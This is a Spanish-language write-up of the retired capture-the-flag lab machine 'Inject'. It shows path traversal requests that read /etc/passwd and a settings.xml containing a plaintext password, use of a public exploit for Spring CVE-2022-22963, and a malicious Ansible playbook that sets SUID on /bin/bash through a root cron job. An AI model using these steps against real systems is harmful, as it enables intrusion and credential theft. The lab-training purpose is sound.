---
title: "Inject"
date: 2025-01-01
description: "Path traversal en image viewer expone credenciales → Spring RCE (CVE-2022-22963) → escalada con Ansible playbook malicioso ejecutado por cron root."
difficulty: Easy
os: Linux
tags: ["path-traversal", "spring", "CVE-2022-22963", "ansible", "cron"]
retired: true
draft: false
---

Machine IP: `10.10.11.204`

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG allPorts
```

Puertos abiertos: **22** y **8080**.

```bash
nmap -sCV -p22,8080 10.10.11.204 -oN targeted
```

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
```

Enumeración de directorios:

```bash
gobuster dir -u http://10.10.11.204:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

```
/register   (Status: 200)
/upload     (Status: 200)
/blogs      (Status: 200)
```

## Path Traversal

Subimos una imagen. El servidor responde con:

```
http://10.10.11.204:8080/show_image?img=exploit.png
```

El parámetro `img` no valida la ruta — path traversal directo:

```bash
curl -s "http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd"
```

Funciona. Usuarios con bash: `root`, `frank`, `phil`.

En `../../../../../../home/frank/.m2/settings.xml` encontramos credenciales:

```xml
<username>phil</username>
<password>DocPhillovestoInject123</password>
```

## Spring RCE — CVE-2022-22963

Revisando `/release_notes` y el `pom.xml` confirmamos Spring Framework vulnerable. Usamos exploit público:

```bash
python3 exploit.py -u http://10.10.11.204:8080
```

Shell como **frank**. Pivotamos a **phil** con las credenciales del `settings.xml`:

```bash
su phil  # DocPhillovestoInject123
```

**User flag obtenida.**

## Escalada → root

Monitorizamos procesos con pspy64:

```
/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

Un cron root ejecuta todos los `.yml` en `/opt/automation/tasks/`. Tenemos escritura en ese directorio.

El playbook original:

```yaml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

Creamos un playbook malicioso:

```yaml
- hosts: localhost
  tasks:
  - name: pwn
    ansible.builtin.shell: chmod +s /bin/bash
```

Esperamos el siguiente ciclo del cron y ejecutamos:

```bash
bash -p
# whoami → root
```

**Root shell obtenida.**

Happy Hacking!!
